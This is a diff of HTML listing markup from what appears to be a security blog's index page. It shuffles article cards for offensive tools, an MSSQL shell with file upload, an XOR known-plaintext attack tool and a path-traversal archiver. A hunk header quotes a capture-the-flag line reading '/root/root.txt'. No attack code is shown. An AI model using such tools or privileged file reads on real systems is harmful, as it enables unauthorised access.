+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2421,269 +2735,6 @@ fortune# cat /root/root.txt
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
